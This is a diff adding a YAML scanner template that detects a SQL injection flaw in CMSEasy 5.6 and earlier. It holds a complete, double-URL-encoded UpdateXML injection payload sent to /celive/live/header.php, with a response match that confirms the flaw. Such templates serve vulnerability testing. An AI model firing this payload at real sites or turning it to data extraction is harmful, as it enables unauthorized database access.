@@ -1,0 +1,16 @@
+name: poc-cmseasy-sqli
+rules:
+  - method: POST
+    path: /celive/live/header.php
+    headers:
+      User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
+    body: >
+      xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528md5(988505)%2529%2520from%2520user%2529%252C1%252C32%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520</q></xjxquery>
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b'6508c93c342e0ee109a28659a77f3a')
+detail:
+  author: nandisec
+  affect version: cmsEasy <= 5.6
+  links:
+    - https://www.cnblogs.com/yangxiaodi/p/6963624.html
